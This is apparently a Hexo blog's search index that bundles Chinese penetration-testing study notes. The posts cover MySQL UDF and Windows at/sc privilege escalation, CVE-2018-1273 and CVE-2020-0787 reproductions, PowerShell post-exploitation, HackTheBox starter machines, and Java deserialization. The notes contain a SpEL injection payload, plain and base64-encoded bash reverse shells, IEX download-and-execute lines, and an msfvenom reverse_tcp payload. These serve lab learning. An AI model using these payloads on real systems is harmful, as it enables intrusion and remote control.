<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>权限提升——mysql提权</title>
      <link href="2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/"/>
      <url>2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="知识记录"><a href="#知识记录" class="headerlink" title="知识记录"></a>知识记录</h3><p>mysql目录下的的文件</p><p>.MYD 数据文件（包含数据库的密码信息）</p><p>.MYI 表索引文件</p><p>打开root用户的外连</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;%&#39; IDENTIFIED BY &#39;密码&#39; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure><h3 id="UDF提权记录"><a href="#UDF提权记录" class="headerlink" title="UDF提权记录"></a>UDF提权记录</h3><p>1.发现secure_file_priv为NULL(无法上传文件)，前往配置文件my.ini中添加secure_file_priv为空，重启mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%secure%&#39;;</span><br></pre></td></tr></table></figure><p>获取mysql路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/image-20230409200302487.png"></p><p>2.将32位的dll文件上传至/MySQL/lib/plugin/下(MySQL版本大于5.1)</p><p>这里上传dll有两种方式，一种是通过webshell上传UDF dll文件</p><p><img src="/2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/image-20230409201522663.png" alt="image-20230409201522663"></p><p>另一种是通过原生 SQL 语句来导出 UDF 动态链接库文件</p><p>创建/plugin目录(本地测试创建目录失败)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;x&#39; into dumpfile &#39;目录\\lib\\plugin::INDEX_ALLOCATION&#39;;</span><br></pre></td></tr></table></figure><p>32位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  INTO DUMPFILE &#39;D:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/image-20230409205231809.png" alt="image-20230409205231809"></p><p>3.创建函数，并执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;lib_mysqludf_sys_32.dll&#39;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/capture_20230409192931606.bmp" alt="capture_20230409192931606"></p><p>查看已经创建的用户自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func</span><br></pre></td></tr></table></figure><p>删除某个自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>1.导出udf dll</p><p>2.创建反弹函数</p><p>3.执行自定义函数backshell进行反弹</p><p><img src="/2023/04/10/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E2%80%94%E2%80%94mysql%E6%8F%90%E6%9D%83/image-20230409222647334.png" alt="image-20230409222647334"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> udf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地提权——AT&amp;SC提权</title>
      <link href="2023/04/08/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94AT-SC%E6%8F%90%E6%9D%83/"/>
      <url>2023/04/08/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94AT-SC%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="at-提权"><a href="#at-提权" class="headerlink" title="at 提权"></a>at 提权</h3><p>适用版本：windows 2003 &amp; xp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 11:08 &#x2F;interactive cmd</span><br></pre></td></tr></table></figure><p><img src="/2023/04/08/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94AT-SC%E6%8F%90%E6%9D%83/image-20230408111055083.png" alt="image-20230408111055083"></p><h3 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h3><p>适用版本：windows 2003 </p><p>创建一个名叫syscmd的新堵塞交互式的cmd服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D;&quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><p><img src="/2023/04/08/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E2%80%94%E2%80%94AT-SC%E6%8F%90%E6%9D%83/image-20230408112701063.png" alt="image-20230408112701063"></p>]]></content>
      
      
      <categories>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>spring代码执行(CVE-2018-1273)</title>
      <link href="2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/"/>
      <url>2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00漏洞简述"><a href="#0x00漏洞简述" class="headerlink" title="0x00漏洞简述"></a>0x00漏洞简述</h3><p>Spring Expression Language是一个功能强大的表达式 语言支持查询和在运行时操作一个对象图。 攻击者可以在未获得授权的情况下，将精心制作的请求参数注入到存在该漏洞的服务器上，从而发起远程代码执行攻击。</p><p>当用户在项目中利用了Spring-data的相关web特性对用户的输入参数进行自动匹配的时候，会将用户提交的form表单的key值作为Spel的执行内容，而这一步就是本次漏洞的爆发点。</p><h3 id="0x01漏洞复现"><a href="#0x01漏洞复现" class="headerlink" title="0x01漏洞复现"></a>0x01漏洞复现</h3><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407201630946.png" alt="image-20230407201630946"></p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407205658464.png" alt="image-20230407205658464"></p><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p>通过dnslog进行漏洞验证，发现存在命令执行漏洞，成功创建文件。</p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407205733105.png" alt="image-20230407205733105"></p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407205618558.png" alt="image-20230407205618558"></p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407205948802.png" alt="image-20230407205948802"></p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407210016879.png" alt="image-20230407210016879"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;ping carlhf.dnslog.cn&quot;)]&#x3D;&amp;password&#x3D;&amp;repeatedPassword&#x3D;</span><br></pre></td></tr></table></figure><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>通过bash直接反弹shell</p><p>进入docker容器中的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -i -t [id] &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>未进行编码前的bash反弹shell命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/vps的ip/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>进行base64编码后的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo, YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuMjQ5LjkwLjczLzQ0NDQgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64, -d&#125;|&#123;bash, -i&#125;</span><br></pre></td></tr></table></figure><p>另外一个思路，下载curl下载命令文件再执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o [outputFilePath] [targetFilePath]</span><br></pre></td></tr></table></figure><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407213018829.png" alt="image-20230407213018829"></p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407215531738.png" alt="image-20230407215531738"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;bash &#x2F;tmp&#x2F;bash.sh&quot;)</span><br></pre></td></tr></table></figure><p>成功反弹shell</p><p><img src="/2023/04/07/spring%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2018-1273/image-20230407220946897.png" alt="image-20230407220946897">![](image-20230407220948516.png</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-0787_本地权限提升</title>
      <link href="2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
      <url>2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00漏洞简述"><a href="#0x00漏洞简述" class="headerlink" title="0x00漏洞简述"></a>0x00漏洞简述</h3><p>2020年3月，微软公布了一个影响范围堪称windows全版本的本地提权漏洞CVE-2020-0787，根据微软的漏洞描述，攻击者在使用低权限用户登录系统后，可以利用该漏洞构造恶意程序直接提权到administrator或者system权限。</p><h3 id="0x01影响版本"><a href="#0x01影响版本" class="headerlink" title="0x01影响版本"></a>0x01影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Windows 10 Version 1809 for ARM64-based Systems</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2</span><br><span class="line">Windows RT 8.1</span><br><span class="line">Windows 8.1 for x64-based systems</span><br><span class="line">Windows 8.1 for 32-bit systems</span><br><span class="line">Windows 7 for x64-based Systems Service Pack 1</span><br><span class="line">Windows 7 for 32-bit Systems Service Pack 1</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows 10 Version 1607 for x64-based Systems</span><br><span class="line">Windows 10 Version 1607 for 32-bit Systems</span><br><span class="line">Windows 10 for x64-based Systems</span><br><span class="line">Windows 10 for 32-bit Systems</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows 10 Version 1903 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1903 for x64-based Systems</span><br><span class="line">Windows 10 Version 1903 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1709 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1709 for x64-based Systems</span><br><span class="line">Windows 10 Version 1709 for 32-bit Systems</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows 10 Version 1909 for ARM64-based Systems</span><br><span class="line">Windows 10 Version 1909 for x64-based Systems</span><br><span class="line">Windows 10 Version 1909 for 32-bit Systems</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</span><br><span class="line">Windows Server 2008 for x64-based Systems Service Pack 2</span><br><span class="line">Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</span><br><span class="line">Windows 10 Version 1809 for x64-based Systems</span><br><span class="line">Windows 10 Version 1809 for 32-bit Systems</span><br><span class="line">Windows 10 Version 1803 for ARM64-based Systems</span><br><span class="line">Windows Server, version 1803 (Server Core Installation)</span><br><span class="line">Windows 10 Version 1803 for x64-based Systems</span><br><span class="line">Windows 10 Version 1803 for 32-bit Systems</span><br></pre></td></tr></table></figure><h3 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h3><p>使用VM虚拟机搭建的以下环境：</p><p>1.win7</p><p><img src="/2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230401204436526.png" alt="image-20230401204436526"></p><p>2.win server 2008 </p><p><img src="/2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230401204609004.png" alt="image-20230401204609004"></p><p>3.win server2016</p><p><img src="/2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230401204759252.png" alt="image-20230401204759252"></p><h3 id="0x03漏洞复现"><a href="#0x03漏洞复现" class="headerlink" title="0x03漏洞复现"></a>0x03漏洞复现</h3><p>此次复现win7, win server 2008复现成功，win server 2016复现失败</p><p>exp下载地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;cbwang505&#x2F;CVE-2020-0787-EXP-ALL-WINDOWS-VERSION&#x2F;releases&#x2F;download&#x2F;1&#x2F;BitsArbitraryFileMoveExploit.exe</span><br></pre></td></tr></table></figure><p>1.检测是否有打补丁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr KB4540673</span><br></pre></td></tr></table></figure><p>2.运行exp</p><p><img src="/2023/04/01/CVE-2020-0787-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230401210536507.png" alt="image-20230401210536507"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>powershell在内网渗透中的使用</title>
      <link href="2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="绕过本地权限执行ps文件"><a href="#绕过本地权限执行ps文件" class="headerlink" title="绕过本地权限执行ps文件"></a>绕过本地权限执行ps文件</h2><p>使用到的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\test.ps1 </span><br></pre></td></tr></table></figure><p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230330201841186.png" alt="image-20230330201841186"></p><p>成功绕过Restricted权限执行test.ps1</p><h2 id="Invoke-shellcode反弹shell"><a href="#Invoke-shellcode反弹shell" class="headerlink" title="Invoke-shellcode反弹shell"></a>Invoke-shellcode反弹shell</h2><p>Invoke-Shellcode.ps1地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.137&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1</span><br></pre></td></tr></table></figure><p>shellcode地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.137&#x2F;code</span><br></pre></td></tr></table></figure><p>1.目标主机加载Invoke-Shellcode.ps1至内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.10.10.137&#x2F;PowerSploit&#x2F;CodeExecution&#x2F;Invoke-Shellcode.ps1&quot;);</span><br></pre></td></tr></table></figure><p>2.目标主机加载shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object    Net.WebClient).DownloadString(&quot;http:&#x2F;&#x2F;10.10.10.137&#x2F;code&quot;)</span><br></pre></td></tr></table></figure><p>3.反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Shellcode -Shellcode ($buf) -Force</span><br></pre></td></tr></table></figure><p>4.出现的问题</p><p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230401105950030.png" alt="image-20230401105950030"></p><h2 id="powershell后门反弹shell"><a href="#powershell后门反弹shell" class="headerlink" title="powershell后门反弹shell"></a>powershell后门反弹shell</h2><p>1.生成后门payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.137 LPORT=5555 -f psh-reflection &gt;x.ps1</span><br></pre></td></tr></table></figure><p>2.将生成的payload放到web服务器上</p><p><img src="/2023/04/01/powershell%E5%9C%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8/image-20230401213747815.png" alt="image-20230401213747815"></p><p>3.攻击机设置监听，并在目标主机通过IEX命令加载ps1文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;10.10.10.137&#x2F;x.ps1&#39;)</span><br></pre></td></tr></table></figure><p>出现的问题</p><p>反弹到msf的会话不稳定，powershell会终止运行</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powershell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackthebox第一次打靶记录</title>
      <link href="2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/"/>
      <url>2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近先暂时放下了代码审计的课程内容，我发现这部分的内容还真不是太好学，首先是课程里的cms搭建(由于资源比较难找)，其次是逻辑还没有搞清楚（可能是老师讲课的问题），所以我选择接下来学习权限提升这部分的内容。有时候真觉得课程里的操作太少了，所以我开始打hackthebox上的靶机来锻炼一下渗透的思维。</p><p>我先从基础的靶机开始，所以会比较简单。</p><h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><p>这个靶机主要是考察telnet/23和nmap对目标的识别，最后通过telnet连接上目标尝试root，admin，administrator空口令登录，root用户登录成功，获取到flag.txt</p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324085703835.png" alt="image-20230324085703835"></p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324085748679.png" alt="image-20230324085748679"></p><h2 id="Fawn"><a href="#Fawn" class="headerlink" title="Fawn"></a>Fawn</h2><p>第二个靶场考察的是FTP(file transfer protocal)/21和os的识别，思路是通过<code>anonymous </code>用户匿名登录上ftp服务获取flag.txt，其中下载文件使用命令<code>get</code>,列出文件列表使用<code>dir</code> <code>ls</code></p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324091835447.png" alt="image-20230324091835447"></p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324092024301.png" alt="image-20230324092024301"></p><p>打开下载到本地的flag.txt</p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324092133486.png" alt="image-20230324092133486"></p><h2 id="dancing"><a href="#dancing" class="headerlink" title="dancing"></a>dancing</h2><p>这个靶机主要考smb(Server Message Block )/445，其中涉及到smbclient工具的使用。</p><p>首先查看共享的目录列表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324093756511.png" alt="image-20230324093756511"></p><p>然后带$符号的是不能直接访问的，而WorkShares是直接可以访问的文件目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\xxx.xxx.xxx.xxx\\WorkShares</span><br></pre></td></tr></table></figure><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324094350253.png" alt="image-20230324094350253"></p><p><img src="/2023/03/24/hackthebox%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20230324094445955.png" alt="image-20230324094445955"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上就是我在hackthebox的Shatring Point部分打的三个靶机的记录。</p>]]></content>
      
      
      <categories>
          
          <category> hackthebox </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>探究java反序列化漏洞</title>
      <link href="2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>2023/01/10/%E6%8E%A2%E7%A9%B6java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以前学反序列化漏洞是以php为例子的，所以我对java的反序列化原理和利用还是比较生疏的，所以趁着这次机会把java反序列化的这块知识搞清楚。刚好最近在学php代码审计，之后就准备开始java代码审计了。因此，这篇文章算是我在学java代码审计前的恶补。</p><h3 id="反序列化漏洞产生的原因"><a href="#反序列化漏洞产生的原因" class="headerlink" title="反序列化漏洞产生的原因"></a>反序列化漏洞产生的原因</h3><p><strong>按照我的理解来说，就是程序在接收用户的序列化字符串后，在进行反序列化的过程中执行了恶意的方法，导致命令执行</strong></p><h4 id="反序列化的过程"><a href="#反序列化的过程" class="headerlink" title="反序列化的过程"></a>反序列化的过程</h4><p>首先，写一个简单的继承<code>java.io.Serializable</code>的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String identify;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mailCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is the &quot;</span>+<span class="keyword">this</span>.identify+<span class="string">&quot;of our company&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着，实例化一个类并将其进行序列化保存至一个二进制文件中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">        e.name = <span class="string">&quot;员工甲&quot;</span>;</span><br><span class="line">        e.identify = <span class="string">&quot;General staff&quot;</span>;</span><br><span class="line">        Employee e = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">             <span class="comment">// 打开一个文件输出流</span></span><br><span class="line">            FileOutputStream fileOut = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\Users\\Oringals\\Desktop\\employee1.db&quot;</span>);</span><br><span class="line">            <span class="comment">// 建立对象输出流</span></span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> 